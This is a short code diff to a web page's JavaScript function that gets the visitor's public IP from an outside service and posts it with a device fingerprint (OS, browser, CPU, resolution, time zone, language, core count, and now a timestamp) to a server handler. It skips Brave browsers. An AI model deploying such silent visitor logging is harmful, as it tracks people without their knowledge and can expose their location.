@@ -31,13 +31,38 @@ function mydata(){
     var check_brave = navigator.brave;
     
     if(check_brave == undefined){
+
+        const currentDate = new Date();
+        const formattedDate = currentDate.toLocaleString('en-US', {
+            weekday: 'short',
+            year: 'numeric',
+            month: 'short',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: true
+        });
+
+
         $.get("https://api.ipify.org",function(data){
         var ip = data
         $.ajax({
             
             type: 'POST',
             url: 'handler.php',
-            data: {"data":`ip : ${ip} \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}`},
+            data: {
+                "data": `ip : ${ip} \n
+                os name : ${OS} \n
+                Version : ${ver} \n
+                Browser Name : ${getbrow} \n
+                Get Browser Version : ${getbrowVer} \n
+                Cpu Name : ${CPU} \n
+                Resolution : ${currentResolution} \n
+                Time Zone : ${timeZone} \n
+                Language : ${language} \n
+                Number Of CPU Core : ${core} \n
+                Current Date : ${formattedDate}`
+            },
             mimeType: 'text'
             });
         });
